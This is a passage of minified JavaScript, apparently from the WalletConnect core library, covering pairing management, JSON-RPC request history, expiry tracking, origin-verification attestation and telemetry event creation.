yc(t,e,n,r){if(Object.is(t,e))return!0;let i=p2(t),o=p2(e);if(i===g2&&(i=qg),o===g2&&(o=qg),i!==o)return!1;switch(i){case j9:return t.toString()===e.toString();case U9:{const u=t.valueOf(),f=e.valueOf();return aF(u,f)}case M9:case z9:case F9:return Object.is(t.valueOf(),e.valueOf());case L9:return t.source===e.source&&t.flags===e.flags;case W9:return t===e}n=n??new Map;const l=n.get(t),c=n.get(e);if(l!=null&&c!=null)return l===e;n.set(t,e),n.set(e,t);try{switch(i){case q9:{if(t.size!==e.size)return!1;for(const[u,f]of t.entries())if(!e.has(u)||!uc(f,e.get(u),u,t,e,n,r))return!1;return!0}case H9:{if(t.size!==e.size)return!1;const u=Array.from(t.values()),f=Array.from(e.values());for(let d=0;d<u.length;d++){const y=u[d],g=f.findIndex(E=>uc(y,E,void 0,t,e,n,r));if(g===-1)return!1;f.splice(g,1)}return!0}case V9:case J9:case Z9:case Q9:case X9:case eF:case tF:case nF:case rF:case iF:case sF:case oF:{if(typeof Buffer<"u"&&Buffer.isBuffer(t)!==Buffer.isBuffer(e)||t.length!==e.length)return!1;for(let u=0;u<t.length;u++)if(!uc(t[u],e[u],u,t,e,n,r))return!1;return!0}case K9:return t.byteLength!==e.byteLength?!1:yc(new Uint8Array(t),new Uint8Array(e),n,r);case Y9:return t.byteLength!==e.byteLength||t.byteOffset!==e.byteOffset?!1:yc(new Uint8Array(t),new Uint8Array(e),n,r);case G9:return t.name===e.name&&t.message===e.message;case qg:{if(!(yc(t.constructor,e.constructor,n,r)||f2(t)&&f2(e)))return!1;const u=[...Object.keys(t),...d2(t)],f=[...Object.keys(e),...d2(e)];if(u.length!==f.length)return!1;for(let d=0;d<u.length;d++){const y=u[d],g=t[y];if(!Object.hasOwn(e,y))return!1;const E=e[y];if(!uc(g,E,y,t,e,n,r))return!1}return!0}default:return!1}}finally{n.delete(t),n.delete(e)}}function cF(t,e){return lF(t,e,B9)}var uF=Object.defineProperty,y2=Object.getOwnPropertySymbols,hF=Object.prototype.hasOwnProperty,fF=Object.prototype.propertyIsEnumerable,im=(t,e,n)=>e in t?uF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,m2=(t,e)=>{for(var n in e||(e={}))hF.call(e,n)&&im(t,n,e[n]);if(y2)for(var n of y2(e))fF.call(e,n)&&im(t,n,e[n]);return t},Rn=(t,e,n)=>im(t,typeof e!="symbol"?e+"":e,n);let go=class extends S4{constructor(e,n,r,i=ti,o=void 0){super(e,n,r,i),this.core=e,this.logger=n,this.name=r,Rn(this,"map",new Map),Rn(this,"version",p6),Rn(this,"cached",[]),Rn(this,"initialized",!1),Rn(this,"getKey"),Rn(this,"storagePrefix",ti),Rn(this,"recentlyDeleted",[]),Rn(this,"recentlyDeletedLimit",200),Rn(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(l=>{this.getKey&&l!==null&&!an(l)?this.map.set(this.getKey(l),l):Dj(l)?this.map.set(l.id,l):Nj(l)&&this.map.set(l.topic,l)}),this.cached=[],this.initialized=!0)}),Rn(this,"set",async(l,c)=>{this.isInitialized(),this.map.has(l)?await this.update(l,c):(this.logger.debug("Setting value"),this.logger.trace({type:"method",method:"set",key:l,value:c}),this.map.set(l,c),await this.persist())}),Rn(this,"get",l=>(this.isInitialized(),this.logger.debug("Getting value"),this.logger.trace({type:"method",method:"get",key:l}),this.getData(l))),Rn(this,"getAll",l=>(this.isInitialized(),l?this.values.filter(c=>Object.keys(l).every(u=>cF(c[u],l[u]))):this.values)),Rn(this,"update",async(l,c)=>{this.isInitialized(),this.logger.debug("Updating value"),this.logger.trace({type:"method",method:"update",key:l,update:c});const u=m2(m2({},this.getData(l)),c);this.map.set(l,u),await this.persist()}),Rn(this,"delete",async(l,c)=>{this.isInitialized(),this.map.has(l)&&(this.logger.debug("Deleting value"),this.logger.trace({type:"method",method:"delete",key:l,reason:c}),this.map.delete(l),this.addToRecentlyDeleted(l),await this.persist())}),this.logger=Sn(n,this.name),this.storagePrefix=i,this.getKey=o}get context(){return Fn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.map.size}get keys(){return Array.from(this.map.keys())}get values(){return Array.from(this.map.values())}addToRecentlyDeleted(e){this.recentlyDeleted.push(e),this.recentlyDeleted.length>=this.recentlyDeletedLimit&&this.recentlyDeleted.splice(0,this.recentlyDeletedLimit/2)}async setDataStore(e){await this.core.storage.setItem(this.storageKey,e)}async getDataStore(){return await this.core.storage.getItem(this.storageKey)}getData(e){const n=this.map.get(e);if(!n){if(this.recentlyDeleted.includes(e)){const{message:i}=Ee("MISSING_OR_INVALID",`Record was recently deleted - ${this.name}: ${e}`);throw this.logger.error(i),new Error(i)}const{message:r}=Ee("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.error(r),new Error(r)}return n}async persist(){await this.setDataStore(this.values)}async restore(){try{const e=await this.getDataStore();if(typeof e>"u"||!e.length)return;if(this.map.size){const{message:n}=Ee("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored value for ${this.name}`),this.logger.trace({type:"method",method:"restore",value:this.values})}catch(e){this.logger.debug(`Failed to Restore value for ${this.name}`),this.logger.error(e)}}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var dF=Object.defineProperty,pF=(t,e,n)=>e in t?dF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Me=(t,e,n)=>pF(t,typeof e!="symbol"?e+"":e,n);let gF=class{constructor(e,n){this.core=e,this.logger=n,Me(this,"name",w6),Me(this,"version",v6),Me(this,"events",new Mm),Me(this,"pairings"),Me(this,"initialized",!1),Me(this,"storagePrefix",ti),Me(this,"ignoredPayloadTypes",[Ri]),Me(this,"registeredMethods",[]),Me(this,"init",async()=>{this.initialized||(await this.pairings.init(),await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.initialized=!0,this.logger.trace("Initialized"))}),Me(this,"register",({methods:r})=>{this.isInitialized(),this.registeredMethods=[...new Set([...this.registeredMethods,...r])]}),Me(this,"create",async r=>{this.isInitialized();const i=Wy(),o=await this.core.crypto.setSymKey(i),l=Nt(be.FIVE_MINUTES),c={protocol:xI},u={topic:o,expiry:l,relay:c,active:!1,methods:r==null?void 0:r.methods},f=LE({protocol:this.core.protocol,version:this.core.version,topic:o,symKey:i,relay:c,expiryTimestamp:l,methods:r==null?void 0:r.methods});return this.events.emit(Ks.create,u),this.core.expirer.set(o,l),await this.pairings.set(o,u),await this.core.relayer.subscribe(o,{transportType:r==null?void 0:r.transportType}),{topic:o,uri:f}}),Me(this,"pair",async r=>{this.isInitialized();const i=this.core.eventClient.createEvent({properties:{topic:r==null?void 0:r.uri,trace:[Jr.pairing_started]}});this.isValidPair(r,i);const{topic:o,symKey:l,relay:c,expiryTimestamp:u,methods:f}=BE(r.uri);i.props.properties.topic=o,i.addTrace(Jr.pairing_uri_validation_success),i.addTrace(Jr.pairing_uri_not_expired);let d;if(this.pairings.keys.includes(o)){if(d=this.pairings.get(o),i.addTrace(Jr.existing_pairing),d.active)throw i.setError(Ei.active_pairing_already_exists),new Error(`Pairing already exists: ${o}. Please try again with a new connection URI.`);i.addTrace(Jr.pairing_not_expired)}const y=u||Nt(be.FIVE_MINUTES),g={topic:o,relay:c,expiry:y,active:!1,methods:f};this.core.expirer.set(o,y),await this.pairings.set(o,g),i.addTrace(Jr.store_new_pairing),r.activatePairing&&await this.activate({topic:o}),this.events.emit(Ks.create,g),i.addTrace(Jr.emit_inactive_pairing),this.core.crypto.keychain.has(o)||await this.core.crypto.setSymKey(l,o),i.addTrace(Jr.subscribing_pairing_topic);try{await this.core.relayer.confirmOnlineStateOrThrow()}catch{i.setError(Ei.no_internet_connection)}try{await this.core.relayer.subscribe(o,{relay:c})}catch(E){throw i.setError(Ei.subscribe_pairing_topic_failure),E}return i.addTrace(Jr.subscribe_pairing_topic_success),g}),Me(this,"activate",async({topic:r})=>{this.isInitialized();const i=Nt(be.FIVE_MINUTES);this.core.expirer.set(r,i),await this.pairings.update(r,{active:!0,expiry:i})}),Me(this,"ping",async r=>{this.isInitialized(),await this.isValidPing(r),this.logger.warn("ping() is deprecated and will be removed in the next major release.");const{topic:i}=r;if(this.pairings.keys.includes(i)){const o=await this.sendRequest(i,"wc_pairingPing",{}),{done:l,resolve:c,reject:u}=Fs();this.events.once(Je("pairing_ping",o),({error:f})=>{f?u(f):c()}),await l()}}),Me(this,"updateExpiry",async({topic:r,expiry:i})=>{this.isInitialized(),await this.pairings.update(r,{expiry:i})}),Me(this,"updateMetadata",async({topic:r,metadata:i})=>{this.isInitialized(),await this.pairings.update(r,{peerMetadata:i})}),Me(this,"getPairings",()=>(this.isInitialized(),this.pairings.values)),Me(this,"disconnect",async r=>{this.isInitialized(),await this.isValidDisconnect(r);const{topic:i}=r;this.pairings.keys.includes(i)&&(await this.sendRequest(i,"wc_pairingDelete",ut("USER_DISCONNECTED")),await this.deletePairing(i))}),Me(this,"formatUriFromPairing",r=>{this.isInitialized();const{topic:i,relay:o,expiry:l,methods:c}=r,u=this.core.crypto.keychain.get(i);return LE({protocol:this.core.protocol,version:this.core.version,topic:i,symKey:u,relay:o,expiryTimestamp:l,methods:c})}),Me(this,"sendRequest",async(r,i,o)=>{const l=ys(i,o),c=await this.core.crypto.encode(r,l),u=ec[i].req;return this.core.history.set(r,l),this.core.relayer.publish(r,c,u),l.id}),Me(this,"sendResult",async(r,i,o)=>{const l=Lf(r,o),c=await this.core.crypto.encode(i,l),u=(await this.core.history.get(i,r)).request.method,f=ec[u].res;await this.core.relayer.publish(i,c,f),await this.core.history.resolve(l)}),Me(this,"sendError",async(r,i,o)=>{const l=jf(r,o),c=await this.core.crypto.encode(i,l),u=(await this.core.history.get(i,r)).request.method,f=ec[u]?ec[u].res:ec.unregistered_method.res;await this.core.relayer.publish(i,c,f),await this.core.history.resolve(l)}),Me(this,"deletePairing",async(r,i)=>{await this.core.relayer.unsubscribe(r),await Promise.all([this.pairings.delete(r,ut("USER_DISCONNECTED")),this.core.crypto.deleteSymKey(r),i?Promise.resolve():this.core.expirer.del(r)])}),Me(this,"cleanup",async()=>{const r=this.pairings.getAll().filter(i=>fs(i.expiry));await Promise.all(r.map(i=>this.deletePairing(i.topic)))}),Me(this,"onRelayEventRequest",async r=>{const{topic:i,payload:o}=r;switch(o.method){case"wc_pairingPing":return await this.onPairingPingRequest(i,o);case"wc_pairingDelete":return await this.onPairingDeleteRequest(i,o);default:return await this.onUnknownRpcMethodRequest(i,o)}}),Me(this,"onRelayEventResponse",async r=>{const{topic:i,payload:o}=r,l=(await this.core.history.get(i,o.id)).request.method;switch(l){case"wc_pairingPing":return this.onPairingPingResponse(i,o);default:return this.onUnknownRpcMethodResponse(l)}}),Me(this,"onPairingPingRequest",async(r,i)=>{const{id:o}=i;try{this.isValidPing({topic:r}),await this.sendResult(o,r,!0),this.events.emit(Ks.ping,{id:o,topic:r})}catch(l){await this.sendError(o,r,l),this.logger.error(l)}}),Me(this,"onPairingPingResponse",(r,i)=>{const{id:o}=i;setTimeout(()=>{Qr(i)?this.events.emit(Je("pairing_ping",o),{}):dr(i)&&this.events.emit(Je("pairing_ping",o),{error:i.error})},500)}),Me(this,"onPairingDeleteRequest",async(r,i)=>{const{id:o}=i;try{this.isValidDisconnect({topic:r}),await this.deletePairing(r),this.events.emit(Ks.delete,{id:o,topic:r})}catch(l){await this.sendError(o,r,l),this.logger.error(l)}}),Me(this,"onUnknownRpcMethodRequest",async(r,i)=>{const{id:o,method:l}=i;try{if(this.registeredMethods.includes(l))return;const c=ut("WC_METHOD_UNSUPPORTED",l);await this.sendError(o,r,c),this.logger.error(c)}catch(c){await this.sendError(o,r,c),this.logger.error(c)}}),Me(this,"onUnknownRpcMethodResponse",r=>{this.registeredMethods.includes(r)||this.logger.error(ut("WC_METHOD_UNSUPPORTED",r))}),Me(this,"isValidPair",(r,i)=>{var o;if(!Nn(r)){const{message:c}=Ee("MISSING_OR_INVALID",`pair() params: ${r}`);throw i.setError(Ei.malformed_pairing_uri),new Error(c)}if(!Rj(r.uri)){const{message:c}=Ee("MISSING_OR_INVALID",`pair() uri: ${r.uri}`);throw i.setError(Ei.malformed_pairing_uri),new Error(c)}const l=BE(r==null?void 0:r.uri);if(!((o=l==null?void 0:l.relay)!=null&&o.protocol)){const{message:c}=Ee("MISSING_OR_INVALID","pair() uri#relay-protocol");throw i.setError(Ei.malformed_pairing_uri),new Error(c)}if(!(l!=null&&l.symKey)){const{message:c}=Ee("MISSING_OR_INVALID","pair() uri#symKey");throw i.setError(Ei.malformed_pairing_uri),new Error(c)}if(l!=null&&l.expiryTimestamp&&be.toMiliseconds(l==null?void 0:l.expiryTimestamp)<Date.now()){i.setError(Ei.pairing_expired);const{message:c}=Ee("EXPIRED","pair() URI has expired. Please try again with a new connection URI.");throw new Error(c)}}),Me(this,"isValidPing",async r=>{if(!Nn(r)){const{message:o}=Ee("MISSING_OR_INVALID",`ping() params: ${r}`);throw new Error(o)}const{topic:i}=r;await this.isValidPairingTopic(i)}),Me(this,"isValidDisconnect",async r=>{if(!Nn(r)){const{message:o}=Ee("MISSING_OR_INVALID",`disconnect() params: ${r}`);throw new Error(o)}const{topic:i}=r;await this.isValidPairingTopic(i)}),Me(this,"isValidPairingTopic",async r=>{if(!At(r,!1)){const{message:i}=Ee("MISSING_OR_INVALID",`pairing topic should be a string: ${r}`);throw new Error(i)}if(!this.pairings.keys.includes(r)){const{message:i}=Ee("NO_MATCHING_KEY",`pairing topic doesn't exist: ${r}`);throw new Error(i)}if(fs(this.pairings.get(r).expiry)){await this.deletePairing(r);const{message:i}=Ee("EXPIRED",`pairing topic: ${r}`);throw new Error(i)}}),this.core=e,this.logger=Sn(n,this.name),this.pairings=new go(this.core,this.logger,this.name,this.storagePrefix)}get context(){return Fn(this.logger)}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}registerRelayerEvents(){this.core.relayer.on(Wt.message,async e=>{const{topic:n,message:r,transportType:i}=e;if(this.pairings.keys.includes(n)&&i!==dt.link_mode&&!this.ignoredPayloadTypes.includes(this.core.crypto.getPayloadType(r)))try{const o=await this.core.crypto.decode(n,r);cw(o)?(this.core.history.set(n,o),await this.onRelayEventRequest({topic:n,payload:o})):Uf(o)&&(await this.core.history.resolve(o),await this.onRelayEventResponse({topic:n,payload:o}),this.core.history.delete(n,o.id)),await this.core.relayer.messages.ack(n,r)}catch(o){this.logger.error(o)}})}registerExpirerEvents(){this.core.expirer.on(fr.expired,async e=>{const{topic:n}=R_(e.target);n&&this.pairings.keys.includes(n)&&(await this.deletePairing(n,!0),this.events.emit(Ks.expire,{topic:n}))})}};var yF=Object.defineProperty,mF=(t,e,n)=>e in t?yF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,sn=(t,e,n)=>mF(t,typeof e!="symbol"?e+"":e,n);let wF=class extends v4{constructor(e,n){super(e,n),this.core=e,this.logger=n,sn(this,"records",new Map),sn(this,"events",new rr.EventEmitter),sn(this,"name",b6),sn(this,"version",E6),sn(this,"cached",[]),sn(this,"initialized",!1),sn(this,"storagePrefix",ti),sn(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(r=>this.records.set(r.id,r)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),sn(this,"set",(r,i,o)=>{if(this.isInitialized(),this.logger.debug("Setting JSON-RPC request history record"),this.logger.trace({type:"method",method:"set",topic:r,request:i,chainId:o}),this.records.has(i.id))return;const l={id:i.id,topic:r,request:{method:i.method,params:i.params||null},chainId:o,expiry:Nt(be.THIRTY_DAYS)};this.records.set(l.id,l),this.persist(),this.events.emit(Or.created,l)}),sn(this,"resolve",async r=>{if(this.isInitialized(),this.logger.debug("Updating JSON-RPC response history record"),this.logger.trace({type:"method",method:"update",response:r}),!this.records.has(r.id))return;const i=await this.getRecord(r.id);typeof i.response>"u"&&(i.response=dr(r)?{error:r.error}:{result:r.result},this.records.set(i.id,i),this.persist(),this.events.emit(Or.updated,i))}),sn(this,"get",async(r,i)=>(this.isInitialized(),this.logger.debug("Getting record"),this.logger.trace({type:"method",method:"get",topic:r,id:i}),await this.getRecord(i))),sn(this,"delete",(r,i)=>{this.isInitialized(),this.logger.debug("Deleting record"),this.logger.trace({type:"method",method:"delete",id:i}),this.values.forEach(o=>{if(o.topic===r){if(typeof i<"u"&&o.id!==i)return;this.records.delete(o.id),this.events.emit(Or.deleted,o)}}),this.persist()}),sn(this,"exists",async(r,i)=>(this.isInitialized(),this.records.has(i)?(await this.getRecord(i)).topic===r:!1)),sn(this,"on",(r,i)=>{this.events.on(r,i)}),sn(this,"once",(r,i)=>{this.events.once(r,i)}),sn(this,"off",(r,i)=>{this.events.off(r,i)}),sn(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),this.logger=Sn(n,this.name)}get context(){return Fn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get size(){return this.records.size}get keys(){return Array.from(this.records.keys())}get values(){return Array.from(this.records.values())}get pending(){const e=[];return this.values.forEach(n=>{if(typeof n.response<"u")return;const r={topic:n.topic,request:ys(n.request.method,n.request.params,n.id),chainId:n.chainId};return e.push(r)}),e}async setJsonRpcRecords(e){await this.core.storage.setItem(this.storageKey,e)}async getJsonRpcRecords(){return await this.core.storage.getItem(this.storageKey)}getRecord(e){this.isInitialized();const n=this.records.get(e);if(!n){const{message:r}=Ee("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(r)}return n}async persist(){await this.setJsonRpcRecords(this.values),this.events.emit(Or.sync)}async restore(){try{const e=await this.getJsonRpcRecords();if(typeof e>"u"||!e.length)return;if(this.records.size){const{message:n}=Ee("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",records:this.values})}catch(e){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(e)}}registerEventListeners(){this.events.on(Or.created,e=>{const n=Or.created;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,record:e})}),this.events.on(Or.updated,e=>{const n=Or.updated;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,record:e})}),this.events.on(Or.deleted,e=>{const n=Or.deleted;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,record:e})}),this.core.heartbeat.on(fo.pulse,()=>{this.cleanup()})}cleanup(){try{this.isInitialized();let e=!1;this.records.forEach(n=>{be.toMiliseconds(n.expiry||0)-Date.now()<=0&&(this.logger.info(`Deleting expired history log: ${n.id}`),this.records.delete(n.id),this.events.emit(Or.deleted,n,!1),e=!0)}),e&&this.persist()}catch(e){this.logger.warn(e)}}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var vF=Object.defineProperty,bF=(t,e,n)=>e in t?vF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,gn=(t,e,n)=>bF(t,typeof e!="symbol"?e+"":e,n);let EF=class extends I4{constructor(e,n){super(e,n),this.core=e,this.logger=n,gn(this,"expirations",new Map),gn(this,"events",new rr.EventEmitter),gn(this,"name",x6),gn(this,"version",S6),gn(this,"cached",[]),gn(this,"initialized",!1),gn(this,"storagePrefix",ti),gn(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),await this.restore(),this.cached.forEach(r=>this.expirations.set(r.target,r)),this.cached=[],this.registerEventListeners(),this.initialized=!0)}),gn(this,"has",r=>{try{const i=this.formatTarget(r);return typeof this.getExpiration(i)<"u"}catch{return!1}}),gn(this,"set",(r,i)=>{this.isInitialized();const o=this.formatTarget(r),l={target:o,expiry:i};this.expirations.set(o,l),this.checkExpiry(o,l),this.events.emit(fr.created,{target:o,expiration:l})}),gn(this,"get",r=>{this.isInitialized();const i=this.formatTarget(r);return this.getExpiration(i)}),gn(this,"del",r=>{if(this.isInitialized(),this.has(r)){const i=this.formatTarget(r),o=this.getExpiration(i);this.expirations.delete(i),this.events.emit(fr.deleted,{target:i,expiration:o})}}),gn(this,"on",(r,i)=>{this.events.on(r,i)}),gn(this,"once",(r,i)=>{this.events.once(r,i)}),gn(this,"off",(r,i)=>{this.events.off(r,i)}),gn(this,"removeListener",(r,i)=>{this.events.removeListener(r,i)}),this.logger=Sn(n,this.name)}get context(){return Fn(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get length(){return this.expirations.size}get keys(){return Array.from(this.expirations.keys())}get values(){return Array.from(this.expirations.values())}formatTarget(e){if(typeof e=="string")return zB(e);if(typeof e=="number")return qB(e);const{message:n}=Ee("UNKNOWN_TYPE",`Target type: ${typeof e}`);throw new Error(n)}async setExpirations(e){await this.core.storage.setItem(this.storageKey,e)}async getExpirations(){return await this.core.storage.getItem(this.storageKey)}async persist(){await this.setExpirations(this.values),this.events.emit(fr.sync)}async restore(){try{const e=await this.getExpirations();if(typeof e>"u"||!e.length)return;if(this.expirations.size){const{message:n}=Ee("RESTORE_WILL_OVERRIDE",this.name);throw this.logger.error(n),new Error(n)}this.cached=e,this.logger.debug(`Successfully Restored expirations for ${this.name}`),this.logger.trace({type:"method",method:"restore",expirations:this.values})}catch(e){this.logger.debug(`Failed to Restore expirations for ${this.name}`),this.logger.error(e)}}getExpiration(e){const n=this.expirations.get(e);if(!n){const{message:r}=Ee("NO_MATCHING_KEY",`${this.name}: ${e}`);throw this.logger.warn(r),new Error(r)}return n}checkExpiry(e,n){const{expiry:r}=n;be.toMiliseconds(r)-Date.now()<=0&&this.expire(e,n)}expire(e,n){this.expirations.delete(e),this.events.emit(fr.expired,{target:e,expiration:n})}checkExpirations(){this.core.relayer.connected&&this.expirations.forEach((e,n)=>this.checkExpiry(n,e))}registerEventListeners(){this.core.heartbeat.on(fo.pulse,()=>this.checkExpirations()),this.events.on(fr.created,e=>{const n=fr.created;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:e}),this.persist()}),this.events.on(fr.expired,e=>{const n=fr.expired;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:e}),this.persist()}),this.events.on(fr.deleted,e=>{const n=fr.deleted;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:e}),this.persist()})}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}};var xF=Object.defineProperty,SF=(t,e,n)=>e in t?xF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Tt=(t,e,n)=>SF(t,typeof e!="symbol"?e+"":e,n);let _F=class extends O4{constructor(e,n,r){super(e,n,r),this.core=e,this.logger=n,this.store=r,Tt(this,"name",_6),Tt(this,"abortController"),Tt(this,"isDevEnv"),Tt(this,"verifyUrlV3",O6),Tt(this,"storagePrefix",ti),Tt(this,"version",EI),Tt(this,"publicKey"),Tt(this,"fetchPromise"),Tt(this,"init",async()=>{var i;this.isDevEnv||(this.publicKey=await this.store.getItem(this.storeKey),this.publicKey&&be.toMiliseconds((i=this.publicKey)==null?void 0:i.expiresAt)<Date.now()&&(this.logger.debug("verify v2 public key expired"),await this.removePublicKey()))}),Tt(this,"register",async i=>{if(!Ja()||this.isDevEnv)return;const o=window.location.origin,{id:l,decryptedId:c}=i,u=`${this.verifyUrlV3}/attestation?projectId=${this.core.projectId}&origin=${o}&id=${l}&decryptedId=${c}`;try{const f=ki.getDocument(),d=this.startAbortTimer(be.ONE_SECOND*5),y=await new Promise((g,E)=>{const w=()=>{window.removeEventListener("message",m),f.body.removeChild(b),E("attestation aborted")};this.abortController.signal.addEventListener("abort",w);const b=f.createElement("iframe");b.src=u,b.style.display="none",b.addEventListener("error",w,{signal:this.abortController.signal});const m=x=>{if(x.data&&typeof x.data=="string")try{const S=JSON.parse(x.data);if(S.type==="verify_attestation"){if(Sy(S.attestation).payload.id!==l)return;clearInterval(d),f.body.removeChild(b),this.abortController.signal.removeEventListener("abort",w),window.removeEventListener("message",m),g(S.attestation===null?"":S.attestation)}}catch(S){this.logger.warn(S)}};f.body.appendChild(b),window.addEventListener("message",m,{signal:this.abortController.signal})});return this.logger.debug("jwt attestation",y),y}catch(f){this.logger.warn(f)}return""}),Tt(this,"resolve",async i=>{if(this.isDevEnv)return"";const{attestationId:o,hash:l,encryptedId:c}=i;if(o===""){this.logger.debug("resolve: attestationId is empty, skipping");return}if(o){if(Sy(o).payload.id!==c)return;const f=await this.isValidJwtAttestation(o);if(f){if(!f.isVerified){this.logger.warn("resolve: jwt attestation: origin url not verified");return}return f}}if(!l)return;const u=this.getVerifyUrl(i==null?void 0:i.verifyUrl);return this.fetchAttestation(l,u)}),Tt(this,"fetchAttestation",async(i,o)=>{this.logger.debug(`resolving attestation: ${i} from url: ${o}`);const l=this.startAbortTimer(be.ONE_SECOND*5),c=await fetch(`${o}/attestation/${i}?v2Supported=true`,{signal:this.abortController.signal});return clearTimeout(l),c.status===200?await c.json():void 0}),Tt(this,"getVerifyUrl",i=>{let o=i||gc;return $6.includes(o)||(this.logger.info(`verify url: ${o}, not included in trusted list, assigning default: ${gc}`),o=gc),o}),Tt(this,"fetchPublicKey",async()=>{try{this.logger.debug(`fetching public key from: ${this.verifyUrlV3}`);const i=this.startAbortTimer(be.FIVE_SECONDS),o=await fetch(`${this.verifyUrlV3}/public-key`,{signal:this.abortController.signal});return clearTimeout(i),await o.json()}catch(i){this.logger.warn(i)}}),Tt(this,"persistPublicKey",async i=>{this.logger.debug("persisting public key to local storage",i),await this.store.setItem(this.storeKey,i),this.publicKey=i}),Tt(this,"removePublicKey",async()=>{this.logger.debug("removing verify v2 public key from storage"),await this.store.removeItem(this.storeKey),this.publicKey=void 0}),Tt(this,"isValidJwtAttestation",async i=>{const o=await this.getPublicKey();try{if(o)return this.validateAttestation(i,o)}catch(c){this.logger.error(c),this.logger.warn("error validating attestation")}const l=await this.fetchAndPersistPublicKey();try{if(l)return this.validateAttestation(i,l)}catch(c){this.logger.error(c),this.logger.warn("error validating attestation")}}),Tt(this,"getPublicKey",async()=>this.publicKey?this.publicKey:await this.fetchAndPersistPublicKey()),Tt(this,"fetchAndPersistPublicKey",async()=>{if(this.fetchPromise)return await this.fetchPromise,this.publicKey;this.fetchPromise=new Promise(async o=>{const l=await this.fetchPublicKey();l&&(await this.persistPublicKey(l),o(l))});const i=await this.fetchPromise;return this.fetchPromise=void 0,i}),Tt(this,"validateAttestation",(i,o)=>{const l=vj(i,o.publicKey),c={hasExpired:be.toMiliseconds(l.exp)<Date.now(),payload:l};if(c.hasExpired)throw this.logger.warn("resolve: jwt attestation expired"),new Error("JWT attestation expired");return{origin:c.payload.origin,isScam:c.payload.isScam,isVerified:c.payload.isVerified}}),this.logger=Sn(n,this.name),this.abortController=new AbortController,this.isDevEnv=ew(),this.init()}get storeKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//verify:public:key"}get context(){return Fn(this.logger)}startAbortTimer(e){return this.abortController=new AbortController,setTimeout(()=>this.abortController.abort(),be.toMiliseconds(e))}};var IF=Object.defineProperty,OF=(t,e,n)=>e in t?IF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,w2=(t,e,n)=>OF(t,typeof e!="symbol"?e+"":e,n);let $F=class extends $4{constructor(e,n){super(e,n),this.projectId=e,this.logger=n,w2(this,"context",P6),w2(this,"registerDeviceToken",async r=>{const{clientId:i,token:o,notificationType:l,enableEncrypted:c=!1}=r,u=`${T6}/${this.projectId}/clients`;await fetch(u,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({client_id:i,type:l,token:o,always_raw:c})})}),this.logger=Sn(n,this.context)}};var PF=Object.defineProperty,v2=Object.getOwnPropertySymbols,TF=Object.prototype.hasOwnProperty,AF=Object.prototype.propertyIsEnumerable,sm=(t,e,n)=>e in t?PF(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,rc=(t,e)=>{for(var n in e||(e={}))TF.call(e,n)&&sm(t,n,e[n]);if(v2)for(var n of v2(e))AF.call(e,n)&&sm(t,n,e[n]);return t},Mt=(t,e,n)=>sm(t,typeof e!="symbol"?e+"":e,n);class CF extends P4{constructor(e,n,r=!0){super(e,n,r),this.core=e,this.logger=n,Mt(this,"context",C6),Mt(this,"storagePrefix",ti),Mt(this,"storageVersion",A6),Mt(this,"events",new Map),Mt(this,"shouldPersist",!1),Mt(this,"init",async()=>{if(!ew())try{const i={eventId:oE(),timestamp:Date.now(),domain:this.getAppDomain(),props:{event:"INIT",type:"",properties:{client_id:await this.core.crypto.getClientId(),user_agent:A_(this.core.relayer.protocol,this.core.relayer.version,Zy)}}};await this.sendEvent([i])}catch(i){this.logger.warn(i)}}),Mt(this,"createEvent",i=>{const{event:o="ERROR",type:l="",properties:{topic:c,trace:u}}=i,f=oE(),d=this.core.projectId||"",y=Date.now(),g=rc({eventId:f,timestamp:y,props:{event:o,type:l,properties:{topic:c,trace:u}},bundleId:d,domain:this.getAppDomain()},this.setMethods(f));return this.telemetryEnabled&&(this.events.set(f,g),this.shouldPersist=!0),g}),Mt(this,"getEvent",i=>{const{eventId:o,topic:l}=i;if(o)return this.events.get(o);const c=Array.from(this.events.values()).find(u=>u.props.properties.topic===l);if(c)return 